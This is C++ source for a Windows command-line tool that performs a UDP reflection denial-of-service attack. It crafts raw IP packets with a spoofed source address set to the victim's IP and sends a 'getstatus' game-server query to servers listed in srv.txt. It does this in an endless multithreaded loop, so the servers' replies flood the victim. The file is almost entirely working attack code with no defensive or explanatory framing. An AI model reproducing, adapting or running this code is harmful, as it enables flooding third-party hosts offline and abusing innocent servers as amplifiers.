#define WIN32_LEAN_AND_MEAN

// Standard headers
#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <WinSock2.h>
#include <time.h>
#include <string>
#include <vector>
#include <fstream>
#include <iostream>
#include <sstream>
#include <direct.h>

#include "headers.h" // IP, UDP headers
#include "misc.h" // Misc headers

using namespace std;

unsigned short packetsize;
unsigned char data[] = "\xFF\xFF\xFF\xFF\x67\x65\x74\x73\x74\x61\x74\x75\x73";
unsigned char *packet;

vector<string> ips;
vector<int> ports;
vector<string> oports;

int cputhreads;
WSAData wsdata;
SOCKET sock;

struct ipheader *iphead;
struct udpheader *udphead;
struct icmpheader *icmphead;
struct sockaddr_in sins;

void main(int argc, char *argv[])
{
	system("cls");

	if(argc != 4)
		errex("Invalid number of arguments");

	const char *a_ip = argv[1];
	int a_pt = atoi(argv[2]);
	int a_th = atoi(argv[3]);

	system("cls");

	if(WSAStartup(MAKEWORD(2, 2), &wsdata) != 0)
		errex("WSAStartup() failed");

	sock = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
	if(sock == 0)
		errex("socket() failed");

	int opt = 1;
	if(setsockopt(sock, IPPROTO_IP, 2, (char *)&opt, sizeof(opt)) == -1)
		errex("setsockopt() failed");


	string line;
	ifstream file("srv.txt");
	if(!file.is_open())
		errex("Cannot open srv.txt");

	while(file.good())
	{
		getline(file, line);
		vector<string> expl = Explode(":", line);
		ips.push_back(expl[0]);

		oports.push_back(expl[1]);
	}

	file.close();

	for(int fi=0; fi<ips.size()-1; fi++)
	{
		ports.push_back(atol(oports[fi].c_str()));
	}

	printf("IP: %s\nPort: %i\nThreads: %i\n", a_ip, a_pt, a_th);
	printf("Loaded %i servers from srv.txt!\n", ips.size());

	printf("Press any key to begin.\n");
	getchar();

	sins.sin_family = AF_INET;
	sins.sin_port = htons(0);

	packetsize = sizeof(struct ipheader) + sizeof(struct udpheader) + sizeof(data);
	packet = (unsigned char *)malloc(packetsize);
	memset(packet, 0, packetsize);

	iphead = (struct ipheader *)packet;
	iphead->ver_len = (4 << 4)|5;
	iphead->tos = 0;
	iphead->packet_len = htons(packetsize);
	iphead->id = 0;
	iphead->flags = 0;
	iphead->ttl = 128;
	iphead->protocol = 0x11;
	iphead->checksum = 0;
	iphead->srcaddr = inet_addr(a_ip);
	iphead->checksum = ip_checksum((unsigned short *)packet, sizeof(struct ipheader));

	udphead = (struct udpheader *)(packet + sizeof(struct ipheader));
	udphead->src_port = htons(a_pt);
	udphead->dest_port = htons(0);
	udphead->length = htons(sizeof(struct udpheader) + sizeof(data));
	udphead->checksum = 0;

	memcpy(packet + sizeof(struct ipheader) + sizeof(struct udpheader), data, sizeof(data)+1);

	printf("Beginning...\n");

	for(int i=0; i<a_th; i++)
		CreateThread(NULL, NULL, (THREAD)SendThread, NULL, NULL, NULL);

	printf("Press any key to stop.");
	getchar();

	closesocket(sock);
	WSACleanup();

	ExitProcess(0);
}

THREAD SendThread()
{
	while(true)
	{
		for(int i=0; i<ports.size(); i++)
		{
			const char *ccip = ips[i].c_str();
			sins.sin_addr.S_un.S_addr = inet_addr(ccip);
			iphead->destaddr = sins.sin_addr.S_un.S_addr;
			udphead->dest_port = htons(ports[i]);

			if(sendto(sock, (const char *)packet, packetsize, 0, (struct sockaddr *)&sins, sizeof(struct sockaddr)) == SOCKET_ERROR)
				printf("sendto() failed: %i\n", WSAGetLastError());
		}
	}
	return 0;
}
